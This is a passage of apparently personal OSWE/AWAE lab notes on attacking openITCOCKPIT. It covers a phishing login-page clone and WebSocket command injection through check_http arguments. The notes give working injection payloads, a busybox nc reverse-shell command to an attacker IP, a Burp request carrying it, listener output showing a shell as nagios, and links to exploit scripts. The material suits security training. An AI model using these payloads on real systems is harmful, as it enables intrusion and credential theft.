...
To make a fake login page samilar to the original one, we will use [stealLoginPageContnet.js](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/stealLoginPageContnet.js):
```text
...
```
Next we will URL decode the content received, and put it into our [client.js](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/client.js) file, in the `loginhtml` variable:
```html
loginhtml = 
`<!DOCTYPE html>
<html lang="en">
...
Note: place [api.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/api.py), [stealLoginPageContnet.js](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/stealLoginPageContnet.js), [db.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/db.py) and [client.js](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/client.js) in the same directory.
...
#### Discovering Websocket Communication
...
#### Finding JavaScript files associated with Websocket
...
Use this client script: [wsclient_rce.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/wsclient_rce.py) 

This is also a client that exploits the RCE directly (in advance): [simple_ws_rce.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/simple_ws_rce.py) 
...
Lets fuzz to see the allowed commands using [cmd_fuzzer.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/cmd_fuzzer.py) passing this wordlist of common Linux commands [commands.txt](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/commands.txt)
...
We will use this script [bypass_cmd_inj_fuzzer.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/bypass_cmd_inj_fuzzer.py) with this wordlist [command-injection-template.txt](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/command-injection-template.txt) 
...
### RCE — Degging Deeper
While we cannot inject into a new command, some commands might allow us to inject into the arguments. For example, the find command accepts the `-exec` argument, which executes a command on each file found.
...
└─$ python3 wsclient.py
>>> [+] Connected!
./check_http -I 192.168.45.185 -p 8000
>>>
```
...
└─$ nc -nlvp 8000 
listening on [any] 8000 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.195.129] 48378
GET / HTTP/1.0
...
└─$ python3 wsclient.py
>>> [+] Connected!
./check_http -I 192.168.45.185 -p 8000 -k string1
>>>
```
...
└─$ nc -nlvp 8000
listening on [any] 8000 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.195.129] 48502
GET / HTTP/1.0
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
Connection: close
string1
...
```
 Now let's try using a single quote (making the argument `-k 'string1 string2'`).
```bash
┌──(kali㉿kali)-[~]
└─$ python3 wsclient.py
>>> [+] Connected!
./check_http -I 192.168.45.185 -p 8000 -k 'string1 string2'
>>>
```
Back to out server:
```bash
...
└─$ nc -nlvp 8000
listening on [any] 8000 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.195.129] 48644
GET / HTTP/1.0
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
Connection: close
string1
...
When we send a single quote, the quote is not escaped and the second string is not included at all. An inconsistency of this type generally suggests that we are injecting an unexpected character. If that is the case, when using a single quote we might be injecting `"string2"` as another command.
...
└─$ python3 wsclient.py
>>> [+] Connected!
./check_http -I 192.168.45.185 -p 8000 -k 'string1 --help'
...
```
The output reveals the help output from the `su` command.

Here's a concise summary of the passage:

The WebSocket connection is set up to execute user input, but to avoid arbitrary command execution, the developers implemented a whitelist—allowing only the `ls` command and executables in the current directory. Based on the response to `--help`, it's likely commands are run as a specific user using `su`. The likely command structure is:

```bash
su someuser -c './check_http -I 192.168.45.185 -p 8000 -k "test --help"'
```

The use of a single quote suggests that user input is enclosed in quotes within the `su -c` command. By injecting a single quote, the input can escape this encapsulation, allowing direct command injection. If a second `-c` is passed in, it can create a nested command execution. This is confirmed by the test where injecting `-c 'echo 'hacked'` results in the command `echo 'hacked'` being executed, demonstrating successful command injection.
```bash
┌──(kali㉿kali)-[~]
└─$ python3 wsclient.py
>>> [+] Connected!
./check_http -I 192.168.45.185 -p 8000 -k 'test -c 'echo 'hacked'
>>> hacked
...
└─$ python3 wsclient.py
>>> [+] Connected!
./check_http -I 192.168.45.185 -p 8000 -k 'test -c 'busybox nc 192.168.45.185 1337 -e sh
>>>
```
Checking out Netcat listener:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.195.129] 50114
id
uid=113(nagios) gid=115(nagios) groups=115(nagios)

```
We successfully gained a reverse shell.

We can achieve the same from direct interaction with the Websocket from BurpSuite, reverse shell request sent:
```json
{
  "task": "execute_nagios_command",
  "data": "./check_http -I 192.168.45.185 -p 8000 -k 'test -c 'busybox nc 192.168.45.185 1337 -e sh",
  "uniqid": "",
  "key": "1fea123e07f730f76e661bced33a94152378611e"
}
```
If we check our Netcat listener, we find a reverse connection has been sent to us:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.195.129] 51414
id
uid=113(nagios) gid=115(nagios) groups=115(nagios)

```
**Automation script:** [wsclient_rce.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/wsclient_rce.py)

Usage:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 wsclient.py --mode rce
[+] Connected!
Enter your attacking machine IP address: 192.168.45.185
Enter the listening port: 1337
[+] Sending RCE payload:
./check_http -I 192.168.45.185 -p 7777 -k 'test -c 'busybox nc 192.168.45.185 1337 -e sh
